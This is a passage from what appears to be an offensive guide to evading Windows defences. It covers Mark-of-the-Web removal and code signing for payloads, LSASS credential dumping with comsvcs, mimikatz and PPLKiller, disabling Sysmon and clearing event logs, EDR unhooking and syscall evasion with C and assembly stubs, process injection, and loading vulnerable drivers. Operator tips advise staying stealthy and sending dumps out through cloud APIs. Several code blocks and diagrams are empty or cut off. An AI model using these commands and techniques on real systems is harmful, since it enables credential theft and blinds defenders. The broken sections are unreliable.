4 = Restricted Sites
```

### MOTW Bypass Techniques  T1553.005

**Method 1: Remove Zone.Identifier ADS**
```powershell
# Remove MOTW  no more SmartScreen prompt
Remove-Item -Path .\payload.exe -Stream Zone.Identifier

# Or via cmd
more < payload.exe > clean_payload.exe
# Streams are not copied by default redirection
```

**Method 2: File format containers without MOTW propagation**
Certain container formats don't propagate MOTW to their contents:
- `.7z` archives (7-Zip doesn't propagate MOTW to extracted files)
- Password-protected ZIPs
- ISO/VHD disk images (pre-Windows 11 22H2  now fixed)
- `.img` files

```
Deliver payload in 7z → user extracts → no MOTW on extracted file → SmartScreen bypass
```

**Method 3: WebDAV delivery**
Files opened directly from WebDAV shares may not receive MOTW depending on the client and configuration.

**Method 4: Code signing**
Obtain a code signing certificate (EV cert gets better reputation). Sign your payload  SmartScreen won't block signed binaries from reputable publishers:
```powershell
signtool.exe sign /f cert.pfx /p password /t http://timestamp.digicert.com payload.exe
```

**Method 5: Rename/copy operation**
```cmd
# Copy removes ADS in some scenarios
copy payload.exe C:\Windows\Tasks\svc.exe
```

## Phase 6: ASR Rules  Attack Surface Reduction

### What It Is

ASR (Attack Surface Reduction) rules are part of **Microsoft Defender for Endpoint** (MDE). They block specific behavioral patterns associated with common malware TTPs, independently of signatures.

ASR rules operate at the **kernel level** via the WdFilter.sys driver  the same driver used by Windows Defender. Each rule has a GUID and can be set to: **Disabled**, **Audit**, or **Block**.

### Key ASR Rules and Bypass

| Rule Name | GUID | Blocks |
|-----------|------|--------|
| Block Office apps spawning child processes | D4F940AB-401B-4EFC-AADC-AD5F3C50688A | Word/Excel → cmd.exe |
| Block Office apps from creating executable content | 3B576869-A4EC-4529-8536-B80A7769E899 | Office writing .exe files |
| Block execution of potentially obfuscated scripts | 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC | Obfuscated PS/JS |
| Block credential stealing from LSASS | 9E6C4E1F-7D60-472F-BA1A-A39EF669E4B0 | OpenProcess on LSASS |
| Block untrusted/unsigned processes from USB | B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4 | USB .exe files |
| Block Win32 API calls from Office macros | 92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B | P/Invoke in macros |
| Block abuse of exploited vulnerable signed drivers | 56A863A9-875C-4D65-AF7B-90D77AB80064 | BYOVD on blocklist |

**Enumerate ASR rules:**
```powershell
# Get all ASR rules and their states
Get-MpPreference | Select-Object -Property AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions

# 0 = Disabled, 1 = Block, 2 = Audit, 6 = Warn
```

**ASR Bypass  LSASS dump rule (9E6C4E1F):**
The `Block credential stealing from LSASS` rule monitors `OpenProcess` calls targeting LSASS with `PROCESS_VM_READ` access. Bypass techniques:
1. **Shadow Copy dump**  access LSASS via VSS without touching the live process
2. **ProcDump signed tool**  some versions are whitelisted
3. **Comsvcs.dll MiniDump**  use trusted system DLL
```cmd
# Comsvcs MiniDump  sometimes bypasses ASR
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

### Reverse Engineering ASR Rules  VDM Analysis

ASR rules aren't hardcoded in the engine binary  they're stored as **precompiled Lua scripts** inside Virus Definition Module (VDM) files. This means they can be extracted, decompiled, and analyzed to find exact bypass conditions:

```
┌─────────────────────────────────────────────────────────┐
│              ASR RULE INTERNALS                           │
└─────────────────────────────────────────────────────────┘

  VDM Files (Virus Definition Modules):
  ├── Location: C:\ProgramData\Microsoft\Windows Defender\
  │             Definition Updates\<RandomGUID>\
  ├── mpasbase.vdm  → threat signatures + ASR rules
  └── mpavbase.vdm  → additional definitions

  Internal Structure:
  ├── Compressed container
  └── Contains LUAC (precompiled Lua) scripts
      ├── Each ASR rule = one Lua script
      ├── Executed by mpengine.dll's Lua interpreter
      └── Contains: rule name, GUID, conditions, actions

  Extraction Pipeline:
  1. Decompress mpasbase.vdm
  2. Extract LUAC files
  3. Decompile with luadec
  4. Search for ASR GUIDs and rule names
```

**Extraction using HackingLZ's tool:**
```bash
python3 extract.py --decompile mpasbase.vdm LUA_mpasbase
```

By reading the decompiled Lua code, you can understand the **exact conditions** each ASR rule checks. For example, the "Block Office applications from creating executable content" rule (`3B576869-A4EC-4529-8536-B80A7769E899`) checks specific parent process names and file extensions  understanding these conditions reveals precise bypass paths that are far more reliable than guessing.

> **OPSEC Tip:** ASR rule definitions update with each Defender signature update. Always extract from the target's current VDM to get the accurate rule logic. Rules change between Defender versions.

## Phase 7: Sysmon  System Monitor

### What It Is

Sysmon (System Monitor) is a **Sysinternals tool / kernel driver** that logs detailed system activity to the Windows Event Log. It's widely deployed by blue teams and feeds SIEMs (Splunk, Sentinel, Elastic) for threat hunting.

```

```

### Key Sysmon Event IDs

| Event ID | Description |
|----------|-------------|
| 1 | Process creation |
| 3 | Network connection |
| 6 | Driver loaded |
| 7 | Image loaded |
| 8 | CreateRemoteThread |
| 10 | Process accessed |
| 11 | File created |
| 12/13 | Registry events |
| 17/18 | Named pipe |
| 22 | DNS query |
| 25 | Process tampering |

### Attacking Sysmon  T1562.001

**Method 1: Identify Sysmon driver name**
By default the driver is `SysmonDrv` but admins often rename it (via `-d` parameter during install):
```powershell
# Find the actual driver name
fltMC.exe                         # List filesystem filter drivers
sc query type=driver state=all    # All drivers
Get-Process Sysmon*               # Process name
reg query HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv
```

**Method 2: Stop Sysmon (requires admin)**
```powershell
# Kill Sysmon service
fltMC unload SysmonDrv
sc stop SysmonDrv
sc delete SysmonDrv
```

**Method 3: Sysmon config manipulation**
Sysmon uses an XML config file. With admin rights, modify the config to exclude your process:
```powershell
# Check current config
sysmon64.exe -c

# Update config to exclude specific process
sysmon64.exe -c new_config.xml
```

**Method 4: Event log clearing**  T1070.001
```powershell
wevtutil cl Microsoft-Windows-Sysmon/Operational
```

**Method 5: Phantom DLL injection to hide from Event 7**
Load your DLL before Sysmon's driver initializes (boot time) or use direct kernel object manipulation to hide from image-load callbacks.

**Method 6: Altitude Takeover  Prevent Sysmon from Loading on Reboot**
Every minifilter driver registers at a specific **altitude** (numeric priority value) with the Filter Manager. Sysmon's altitude is stored in the registry. By registering a dummy driver at Sysmon's altitude *before* it loads, the Filter Manager will refuse to load Sysmon on the next boot:

```
┌─────────────────────────────────────────────────────────┐
│              ALTITUDE TAKEOVER ATTACK                     │
└─────────────────────────────────────────────────────────┘

  Normal boot:
  Filter Manager → loads SysmonDrv at altitude 385201 → OK

  After takeover:
  1. Create dummy driver service at Sysmon's altitude
  2. Set its boot start to earlier than Sysmon
  3. On reboot → dummy claims altitude 385201 first
  4. Sysmon attempts to load → altitude conflict → FAILS

  Result: Sysmon never loads, no events generated
```

This technique works because the Filter Manager enforces unique altitudes  two drivers cannot register at the same altitude simultaneously. By taking the altitude first, the legitimate driver is blocked from loading.

**Method 7: Boot Settings Manipulation**
Modify the Sysmon driver's registry settings to prevent it from loading on boot:
```
HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv
  → Start = 4  (Disabled  won't load on boot)
```

Combined with a reboot, this permanently disables Sysmon until an admin manually re-enables it.

**Method 8: Config File Hijacking**
Sysmon stores its configuration in the registry (encrypted with a session key). By dumping and modifying the configuration, you can add exclusion rules for your processes, effectively blinding Sysmon to your activity while leaving it "running" for all other processes.

**Method 9: Sysmon ETW Provider Patching**
Sysmon uses ETW to deliver events to the Windows Event Log. By patching Sysmon's ETW provider (using the same `_ETW_REG_ENTRY` → `_ETW_GUID_ENTRY` → `IsEnabled` technique from Phase 5), events are generated by the driver but never delivered to consumers:

```
SysmonDrv → generates events → ETW Provider (patched: IsEnabled=0) → ∅ (events dropped)
```

**Method 10: Sysmon Process Suspend/Resume**
Suspend the Sysmon user-mode process while keeping the driver loaded. Events queue up in kernel buffers but are never processed by the user-mode service. Once buffers fill, events are dropped silently.

**Method 11: Filter Manager API Unloading**
Use the Filter Manager API (`FltUnloadFilter()`) to programmatically unload the Sysmon minifilter driver. This is equivalent to `fltMC unload` but can be done from custom code without spawning a suspicious process:

```c
// Programmatic minifilter unload
HRESULT hr = FilterUnload(L"SysmonDrv");
// No child process creation  no Sysmon Event 1 for fltMC
```

> **OPSEC Tip:** Sysmon Event 10 (process accessed) with `lsass.exe` as target + `PROCESS_VM_READ` access is one of the **highest-fidelity detections** in any SOC. Avoid direct LSASS handle acquisition. The altitude takeover technique is particularly stealthy because Sysmon simply fails to load on boot  there are no events generated at all (you can't log your own failure to start).

---

## Phase 8: PPL  Protected Process Light

### What It Is

PPL (Protected Process Light) is a Windows security mechanism that restricts which processes can open a handle to a protected process with sensitive access rights. LSASS can run as PPL, preventing memory dumps even from SYSTEM.

                   Is caller PPL ≥ target PPL?

                   NO → ACCESS DENIED

  ├── Windows       (system processes)
  ├── WindowsTcb    (anticheat, kernel)
  └── Antimalware   (AV, EDR  LSASS uses this)
```

### Check If LSASS Is PPL

```powershell
# Method 1: Registry
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\LSA' -Name RunAsPPL
# 1 = PPL enabled, 2 = PPL with UEFI lock

# Method 2: Process Explorer
# Protected column shows "Protected" for PPL processes

# Method 3: PowerShell
$lsass = Get-Process lsass
# Check EPROCESS.Protection field via kernel
```

### Bypass: PPL via Vulnerable Driver (BYOVD)  T1068

Since only kernel code can modify PPL levels, a vulnerable kernel driver is required:

**PPLdump / PPLKiller approach:**
1. Load a vulnerable driver (e.g., `RTCore64.sys`, `procexp.sys`)
2. Use arbitrary kernel read/write primitive from vulnerability
3. Find `EPROCESS` structure for LSASS
4. Modify `EPROCESS.Protection` field: set SignatureLevel and Type to 0 (unprotected)
5. Now dump LSASS normally

```powershell
# PPLKiller  uses vulnerable driver
.\PPLKiller.exe /disablePPL lsass.exe
# Now dump normally
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

**Alternative: MalSecLogon**
Abuse `SecLogon` service to create a process with a handle to LSASS, bypassing PPL because the service itself has higher PPL:
```powershell
# MalSecLogon exploits the Secondary Logon service
MalSecLogon.exe lsass.exe output.dmp
```

### PPL Internals  EPROCESS Protection Field

The protection level is stored as a **single byte** in the kernel's `EPROCESS` structure under the `Protection` field. This byte is a combination of three bit fields:

```
┌─────────────────────────────────────────────────────────┐
│         EPROCESS.Protection BYTE LAYOUT                   │
└─────────────────────────────────────────────────────────┘

  Bits:  [7  6  5  4] [3] [2  1  0]
         │  Signer  │ Aud│   Type  │
         └──────────┘ └──┘ └───────┘

  Signer Values:                    Type Values:
  0 = None                         0 = None (unprotected)
  1 = Authenticode                 1 = ProtectedLight (PPL)
  2 = CodeGen                     2 = Protected (PP)
  3 = Antimalware
  4 = Lsa
  5 = Windows
  6 = WinTcb
  7 = WinSystem

  LSASS with PPL:
  Signer=Lsa(4), Type=ProtectedLight(1) → 0x41

  To remove protection:
  Write 0x00 to EPROCESS->Protection → both Signer and Type = 0
```

**Rootkit-based PPL patching flow:**
1. Client sends PID and desired protection level via IOCTL to the driver
2. Driver calls `PsLookupProcessByProcessId()` to get the `EPROCESS` pointer
3. Driver computes the address: `EPROCESS + Protection_Offset`
4. Driver writes the new protection byte (0x00 to remove, 0x41 to set LSA-Light)

**Vulnerable driver PPL patching flow (e.g., RTCore64.sys):**
1. Call `EnumDeviceDrivers()` to find `ntoskrnl.exe` base address
2. Load `ntoskrnl.exe` into user mode, resolve `PsInitialSystemProcess` offset
3. Use driver's read primitive to get `PsInitialSystemProcess` kernel address
4. Walk the `ActiveProcessLinks` linked list to find LSASS's `EPROCESS`
5. Use driver's write primitive to set `EPROCESS->Protection = 0x00`

### LSASS Credential Dumping Methods

Once PPL and Credential Guard are handled, multiple methods exist for dumping LSASS credentials:

```
┌─────────────────────────────────────────────────────────┐
│              LSASS DUMPING METHODS                        │
└─────────────────────────────────────────────────────────┘

  Method 1: Mimikatz (sekurlsa::logonpasswords)
  └── Direct memory read via debug privilege
      Most detected  use only after disabling all controls

  Method 2: MiniDumpWriteDump + NtWriteFile Hooking
  └── Hook NtWriteFile before calling MiniDumpWriteDump
      Intercept dump output, encrypt/redirect to custom location
      Avoids writing plaintext dump to disk

  Method 3: Custom MiniDumpWriteDump Implementation
  └── Reimplement MiniDumpWriteDump from scratch
      Avoid using dbghelp.dll (monitored by EDR)
      Walk LSASS memory structures manually

  Method 4: Windows Error Reporting (WER) Abuse
  └── Trigger WER crash report on LSASS
      WER service (WerSvc) creates a dump as SYSTEM
      Dump is written to WER report directory
      Extract credentials from WER dump offline

  Method 5: Volume Shadow Copy
  └── Create VSS snapshot
      Copy SAM/SECURITY/SYSTEM from shadow copy
      Parse offline  never touches live LSASS
```

**WER Abuse** is particularly effective because:
- The WER service runs as SYSTEM with sufficient privileges
- No direct LSASS handle needed  WER handles the dump internally
- The dump is created by a legitimate Windows service
- No Sysmon Event 10 (process accessed) generated for your process

> **Exfiltration:** After dumping, use the GitHub API, Azure Blob Storage, or other legitimate cloud APIs to exfiltrate the dump file. This blends with normal enterprise traffic patterns.

## Phase 9: EDR  Endpoint Detection & Response

### What It Is

EDR (Endpoint Detection & Response) is the apex predator of the defensive stack. Solutions like CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint (MDE), Carbon Black, Sophos Intercept X, and Elastic Defend combine **kernel-level visibility**, **cloud analytics**, and **user-mode instrumentation** to detect, investigate, and respond to threats in real time.

Unlike traditional AV (signature-matching), EDR correlates behavioral telemetry across process creation, memory operations, network connections, file I/O, and registry changes to identify attack chains  even when individual actions look benign.

### How EDR Sees You  The Four Telemetry Pillars

Understanding exactly *how* an EDR collects data is the foundation for every bypass. There are four primary telemetry sources, each requiring different evasion techniques:

#### Pillar 1: Kernel Callbacks

Kernel callbacks are the **most powerful** telemetry source  they cannot be bypassed from user mode. The EDR's kernel driver registers callback routines that the Windows kernel invokes on security-relevant events:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    KERNEL CALLBACK TYPES                              │
└─────────────────────────────────────────────────────────────────────┘

  Callback API                           │ Fires On
  ───────────────────────────────────────│──────────────────────────
  PsSetCreateProcessNotifyRoutineEx      │ Every process creation
  PsSetCreateThreadNotifyRoutine         │ Every thread creation
  PsSetLoadImageNotifyRoutine            │ Every DLL/image load
  ObRegisterCallbacks                    │ Handle operations (open/dup)
  CmRegisterCallbackEx                   │ Registry read/write/delete
  FltRegisterFilter (Minifilter)         │ File create/read/write/delete

  Storage: Callback arrays in kernel memory
  ├── PspCreateProcessNotifyRoutine[64]   → up to 64 callbacks
  ├── PspCreateThreadNotifyRoutine[64]    → up to 64 callbacks
  ├── PspLoadImageNotifyRoutine[64]       → up to 64 callbacks
  └── Each entry: EX_CALLBACK_ROUTINE_BLOCK → function pointer
```

**Why they matter:** When you call `CreateProcess`, the kernel invokes every registered `PsSetCreateProcessNotifyRoutineEx` callback *before* the process starts executing. The EDR sees the full command line, parent PID, and image path  regardless of any user-mode tricks.

#### Pillar 2: ETW-TI (Event Tracing for Windows  Threat Intelligence)

ETW-TI is a special **kernel-mode** ETW provider (`Microsoft-Windows-Threat-Intelligence`, GUID: `f4e1897c-bb5d-5668-f1d8-040f4d8dd344`) that fires on security-sensitive memory operations:

- `NtAllocateVirtualMemory` (cross-process memory allocation)
- `NtWriteVirtualMemory` (cross-process memory writes)
- `NtMapViewOfSection` (section mapping for injection)
- `NtSetContextThread` (thread context manipulation)
- `NtQueueApcThread` (APC injection)

ETW-TI runs entirely in kernel mode and is a **Protected Process (PP)** level provider  only PP/PPL processes can consume it. It **cannot be patched from user mode**.

```
  Sensitive API call (user mode)
       │
       ▼
  ntoskrnl.exe checks ETW-TI registration
       │
       ├── _ETW_REG_ENTRY → _ETW_GUID_ENTRY
       │                     └── ProviderEnableInfo (IsEnabled flag)
       │
       ├── IsEnabled == 1 → generate ETW-TI event → EDR receives it
       └── IsEnabled == 0 → skip event (patched/blind)
```

#### Pillar 3: User-Mode Hooks (ntdll Inline Hooks)

The EDR injects a DLL into **every** process at startup. This DLL patches the first bytes of sensitive `Nt*` functions in `ntdll.dll` with a `jmp` instruction (trampoline) redirecting execution to the EDR's inspection code:

```
  BEFORE EDR:
  NtWriteVirtualMemory:
    4C 8B D1          mov r10, rcx
    B8 3A 00 00 00    mov eax, 0x3A    ← SSN
    0F 05             syscall
    C3                ret

  AFTER EDR HOOK:
  NtWriteVirtualMemory:
    E9 XX XX XX XX    jmp EDR_hook     ← 5-byte inline hook
    00 00 00 00       (overwritten bytes)
    0F 05             syscall
    C3                ret

  EDR_hook:
    → Log arguments (target PID, buffer, size)
    → Check against rules (is this process injection?)
    → If clean: execute trampoline → original syscall
    → If suspicious: block + alert
```

**Commonly hooked functions:** `NtWriteVirtualMemory`, `NtAllocateVirtualMemory`, `NtCreateThreadEx`, `NtOpenProcess`, `NtMapViewOfSection`, `NtCreateSection`, `NtProtectVirtualMemory`, `NtQueueApcThread`, `NtSetContextThread`

#### Pillar 4: Minifilter Drivers (File I/O)

EDR kernel drivers register as Windows minifilter drivers to intercept all file system operations. Every file create, read, write, rename, and delete passes through the EDR's filter  this is how EDR detects payload drops, tool staging, and credential dump file creation.

```
  Application → CreateFile("payload.exe")
       │
       ▼
  Filter Manager (fltmgr.sys)
       │
       ├── EDR minifilter (altitude 385xxx) → scans file content
       ├── WdFilter.sys (Defender minifilter) → signature scan
       └── Other filters...
       │
       ▼
  NTFS file system driver → disk I/O
```

### User-Mode Evasion  Bypassing API Hooks

User-mode evasion targets **Pillar 3** (ntdll hooks). These techniques work without admin privileges and are the first line of attack.

#### Technique 1: API Unhooking  Fresh ntdll Copy (T1562.001)

Load a clean copy of `ntdll.dll` from disk and overwrite the hooked `.text` section in memory:

```c
// 1. Map a clean copy of ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// 2. Find the .text section in both copies
// 3. VirtualProtect the hooked .text section to RWX
// 4. memcpy the clean .text over the hooked .text
// 5. Restore original protection
// Result: All EDR hooks removed  functions are clean
```

**Variants:**
- **KnownDlls unhooking**  Read from `\KnownDlls\ntdll.dll` object directory (avoids touching the filesystem)
- **Suspended process unhooking**  Spawn a suspended process, read its pristine `ntdll.dll` before EDR hooks it
- **Perun's Fart**  Map ntdll from `\SystemRoot\System32\ntdll.dll` using `NtOpenSection`
- **Blindside**  Create a process in debug mode with breakpoint on `LdrLoadDll`, forcing only ntdll to load (no EDR DLL injection), then copy the clean ntdll

> **Detection:** EDR monitors for `NtMapViewOfSection` / `NtCreateSection` targeting ntdll.dll. Some EDRs periodically verify their hooks are intact by re-checking the first bytes of hooked functions.

#### Technique 2: Direct Syscalls (T1106)

Skip ntdll entirely  execute the `syscall` instruction directly in your code with the correct System Service Number (SSN):

```asm
; Direct NtAllocateVirtualMemory syscall stub (x64)
NtAllocateVirtualMemory PROC
    mov r10, rcx            ; Windows syscall convention
    mov eax, 0x18           ; SSN for NtAllocateVirtualMemory (version-specific!)
    syscall                 ; transition to kernel
    ret
NtAllocateVirtualMemory ENDP
```

**The SSN Problem:** System Service Numbers change between Windows versions and even between patches. Hardcoding SSNs is fragile. Dynamic resolution techniques solve this:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SSN RESOLUTION TECHNIQUES                         │
└─────────────────────────────────────────────────────────────────────┘

  Hell's Gate (2020)
  └── Read SSN directly from ntdll's Zw* export stubs
      Pattern: 4C 8B D1 B8 [SSN] 00 00 00
      Problem: fails if the stub is hooked (bytes overwritten)

  Halo's Gate (2021)
  └── If target function is hooked, scan neighboring functions
      (NtOpenProcess ±1, ±2...) for clean stubs
      Calculate target SSN from neighbor's SSN ± offset

  Tartarus' Gate (2021)
  └── Handles multiple consecutive hooked functions
      Walks further in both directions until a clean stub found
      More robust against aggressive hooking

  FreshyCalls (2022)
  └── Sort all Zw* exports by address → position = SSN
      Completely avoids reading stub bytes
      Works regardless of hooking
```

**Tools:** SysWhispers (v1: hardcoded SSNs, v2: indirect syscalls, v3: all methods + jmp-based indirect), HellsGate, HalosGate, TartarusGate, FreshyCalls, SysWhispers3

> **Detection weakness:** The `syscall` instruction executes from your code's memory region (not ntdll). EDR kernel callbacks see a return address pointing to unbacked/suspicious memory  call stack analysis catches this.

#### Technique 3: Indirect Syscalls

Instead of embedding the `syscall` instruction in your shellcode (detectable by call stack analysis), **jump to the syscall instruction that already exists inside ntdll.dll**:

```
  DIRECT SYSCALL (detectable):
  your_code.exe:
    mov r10, rcx
    mov eax, SSN
    syscall         ← executes from YOUR code → suspicious return address
    ret

  INDIRECT SYSCALL (stealthier):
  your_code.exe:
    mov r10, rcx
    mov eax, SSN
    jmp [ntdll!NtXxx+0x12]   ← jump to ntdll's syscall;ret gadget

  ntdll.dll:
    ...
    0F 05           syscall   ← executes from ntdll → legitimate return address
    C3              ret       → returns to your code
```

The return address on the kernel's stack now points into `ntdll.dll`  passing basic call stack validation.

**Tools:** SysWhispers2/3 (indirect mode), RecycledGate, LoudSunRun

#### Technique 4: VEH-Based Syscalls  LayeredSyscall

A 2024 technique that combines Vectored Exception Handlers with hardware breakpoints to generate **legitimate call stacks** while executing indirect syscalls:

```
┌─────────────────────────────────────────────────────────────────────┐
│              LAYEREDSYSCALL TECHNIQUE (2024)                         │
└─────────────────────────────────────────────────────────────────────┘

  1. Register two Vectored Exception Handlers (VEH)

  2. Handler #1 (Setup):
     ├── Trigger ACCESS_VIOLATION → enters exception handler
     ├── Scan ntdll for syscall opcode (0F 05) near target function
     ├── Set DR0 = syscall address, DR1 = ret address
     └── Enable breakpoints via DR7

  3. Call a BENIGN Windows API (e.g., GetCurrentProcessId)
     └── Execution flows through legitimate Windows code
         building a REAL call stack

  4. Handler #2 (Intercept):
     ├── Hardware breakpoint fires at syscall instruction
     ├── Save original context (RCX, RDX, R8, R9)
     ├── Enable Trap Flag (single-step execution)
     ├── Monitor until execution reaches ntdll address space
     ├── Replace arguments with target syscall args
     ├── Set RAX = target SSN
     └── Continue execution → syscall executes with legitimate stack

  Result:
  ├── Call stack: RtlUserThreadStart → kernel32 → ntdll → syscall
  ├── Return address: inside ntdll.dll (legitimate)
  ├── No remapped ntdll copies (evades remap detection)
  └── No direct syscall instructions in attacker code
```

This technique was demonstrated to bypass Sophos Intercept X. It addresses three detection vectors simultaneously: remapping detection, direct syscall detection, and indirect syscall detection.

#### Technique 5: Call Stack Spoofing

EDRs increasingly validate the **entire call chain**  not just the immediate return address. A suspicious stack like `shellcode → NtWriteVirtualMemory` triggers alerts even with indirect syscalls. Call stack spoofing creates fake legitimate-looking frames:

**Method A: Thread Pool Proxying (TpAllocWork)**

Execute the target API in a Windows thread pool thread with a naturally legitimate call stack:

```c
// The callback executes in a worker thread with clean stack:
// ntdll!RtlUserThreadStart → ntdll!TppWorkerThread → your_callback
TpAllocWork(&work, callback_func, param, NULL);
TpPostWork(work);
TpReleaseWork(work);
// Wait for completion via event object
```

**Method B: RBP Chain Manipulation**

Forge fake stack frames by manipulating the RBP (frame pointer) chain:

```
  Real stack:             Spoofed stack:
  ┌──────────────┐       ┌──────────────┐
  │ shellcode ret │       │ kernel32 ret │  ← fake return address
  ├──────────────┤       ├──────────────┤
  │ random data  │       │ ntdll ret    │  ← fake frame
  ├──────────────┤       ├──────────────┤
  │ ...          │       │ RtlUserStart │  ← fake origin
  └──────────────┘       └──────────────┘
```

Push fake return addresses pointing into legitimate modules before making the API call. The call stack unwinder follows the RBP chain and sees a legitimate-looking trace.

**Method C: Timer-Based Dynamic Spoofing**

Used in modern C2 frameworks like Cobalt Strike (4.9+): dynamically spoof the call stack using timer callbacks. The `CallStackMasker` approach uses `NtSetTimer2` to execute callbacks with controlled stack frames.

**Method D: SilentMoonwalk**

Fully dynamic call stack spoofer that creates synthetic call chains by selecting return addresses from loaded legitimate modules. Unlike static spoofing, it generates different call stacks each time.

**Notable tools:** ThreadStackSpoofer (sleeping thread stack spoofing), SilentMoonwalk, Vulcan Raven, CallstackSpoofingPOC, CallStackMasker

#### Technique 6: Sleep Obfuscation  Evading Memory Scanners

When a beacon sleeps, its shellcode sits idle in memory  a perfect target for memory scanners. Sleep obfuscation encrypts the beacon's memory during sleep and restores it on wake:

```
┌─────────────────────────────────────────────────────────────────────┐
│              SLEEP OBFUSCATION EVOLUTION                              │
└─────────────────────────────────────────────────────────────────────┘

  FOLIAGE (2021)  First Implementation

```

> **Detection challenge:** Windows provides no native telemetry for observing timer-queue timers or waitable timers used maliciously. This makes sleep obfuscation one of the hardest techniques to detect, hence its adoption in every major C2 framework.

#### Technique 7: Hardware Breakpoint Hooking

Use CPU debug registers (DR0-DR3) to intercept function calls **without modifying any code bytes**  completely invisible to memory integrity checks:

```
┌─────────────────────────────────────────────────────────────────────┐
│         HARDWARE BREAKPOINT HOOKING FLOW                              │
└─────────────────────────────────────────────────────────────────────┘

  1. Register VEH: AddVectoredExceptionHandler(1, handler)

  2. Set hardware breakpoint on target function:
     GetThreadContext() → set DR0 = target_func_address
     DR7 = enable DR0 (local, execute-on-access)
     SetThreadContext() → must be set per-thread

  3. When target function called → CPU raises #DB exception
     └── VEH handler fires:
         ├── Check: is RIP == target_func?
         ├── Modify RAX (return value) or redirect RIP
         └── Return EXCEPTION_CONTINUE_EXECUTION

  Applications:
  ├── AMSI bypass: DR0 = AmsiScanBuffer → force return AMSI_RESULT_CLEAN
  ├── ETW bypass:  DR1 = EtwEventWrite → skip function (ret immediately)
  ├── EDR hook bypass: intercept before EDR's trampoline
  └── Function argument modification: change params before EDR sees them

  Advantages:
  ├── Zero memory modifications → integrity checks pass
  ├── Per-thread (DR0-DR3 are thread-local)
  └── Only 4 breakpoints available per thread (DR0-DR3)
```

> **Detection:** Monitor for `SetThreadContext` / `NtSetContextThread` calls that modify debug registers. Some EDRs clear debug registers on thread creation or context switches. Monitoring the VEH chain via `AddVectoredExceptionHandler` can also reveal suspicious handlers.

### Process Injection Techniques (T1055)

Process injection lets an attacker execute code in the context of another process  inheriting its identity, privileges, and trust level. Modern EDR detects classic injection patterns, so advanced techniques have evolved:

```
┌─────────────────────────────────────────────────────────────────────┐
│              PROCESS INJECTION TECHNIQUES                             │
└─────────────────────────────────────────────────────────────────────┘

  CLASSIC (heavily detected):
  ├── Process Hollowing (T1055.012)
  │   CreateProcess(SUSPENDED) → NtUnmapViewOfSection → WriteProcessMemory
  │   → SetThreadContext → ResumeThread
  │
  ├── Remote Thread Injection
  │   OpenProcess → VirtualAllocEx → WriteProcessMemory
  │   → CreateRemoteThread
  │
  └── APC Injection
      OpenThread → QueueUserAPC → target thread runs payload

  ADVANCED (harder to detect):
  ├── Process Doppelganging (T1055.013)
  │   Uses NTFS transactions: NtCreateTransaction → create file in txn
  │   → write payload → NtCreateSection from txn file
  │   → NtRollbackTransaction (file never hits disk)
  │   → NtCreateProcessEx from section
  │
  ├── Process Herpaderping
  │   Create file → write payload → NtCreateSection (cached)
  │   → overwrite file with clean content BEFORE AV scans
  │   → NtCreateProcessEx from section (still has payload in memory)
  │   AV scans the clean file on disk  mismatch!
  │
  ├── Mockingjay (2023)
  │   Find DLL with RWX section already loaded in target
  │   → Write shellcode into existing RWX memory
  │   No VirtualAllocEx, no VirtualProtect, no CreateRemoteThread
  │   EDR never sees memory allocation or permission changes
  │
  ├── PoolParty (2023)
  │   Abuse Windows Thread Pool internals
  │   8 variants targeting different worker factory objects
  │   Insert malicious work items into target's thread pool
  │   Bypassed all top 5 EDRs at presentation time
  │
  ├── Module Stomping / Overloading
  │   Load a legitimate DLL → overwrite its .text with shellcode
  │   Code runs from a "legitimate" module's address space
  │   Call stack shows code executing from known DLL
  │
  └── Phantom DLL Loading
      Load DLL without registering in PEB→Ldr linked lists
      Process appears to have fewer modules than it actually does
      DLL is "invisible" to PEB enumeration tools
```

### Kernel-Mode Evasion  Attacking the Driver

When user-mode techniques aren't enough, attacking the EDR's **kernel driver** removes visibility at the source. All kernel-mode attacks require **admin/SYSTEM** privileges and typically use BYOVD.

#### BYOVD  Bring Your Own Vulnerable Driver (T1068)

Load a legitimate, digitally-signed Windows driver that contains exploitable vulnerabilities. The driver's valid signature passes Driver Signature Enforcement (DSE), and its vulnerabilities provide arbitrary kernel memory read/write primitives:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BYOVD ATTACK FLOW                                  │
└─────────────────────────────────────────────────────────────────────┘

  1. DROP ─── Copy signed vulnerable .sys file to disk
  2. LOAD ─── sc create VulnDrv binpath=C:\path\vuln.sys type=kernel
              sc start VulnDrv
  3. EXPLOIT ─ DeviceIoControl(hDevice, IOCTL_CODE, &input, ...)
              └── Vulnerability gives arbitrary kernel read/write
  4. ATTACK ── Use read/write primitive to:
              ├── Remove kernel callbacks
              ├── Disable ETW-TI
              ├── Kill EDR processes
              ├── Strip PPL protection
              └── Modify tokens
```

**Commonly abused vulnerable drivers:**

| Driver | Source | Vulnerability |
|--------|--------|---------------|
| `RTCore64.sys` | MSI Afterburner | CVE-2019-16098  arbitrary physical memory R/W |
| `procexp152.sys` | Process Explorer (Sysinternals) | Process termination IOCTL |
| `gdrv.sys` | GIGABYTE tools | Arbitrary physical memory R/W |
| `DBUtil_2_3.sys` | Dell firmware utility | CVE-2021-21551  kernel memory R/W |
| `truesight.sys` (v2.0.2) | RogueKiller Antirootkit (Adlice) | Pre-2015 signing loophole |
| `ene.sys` | ENE Technology | Physical memory access |
| `WinRing0x64.sys` | OpenHardwareMonitor | MSR and physical memory access |
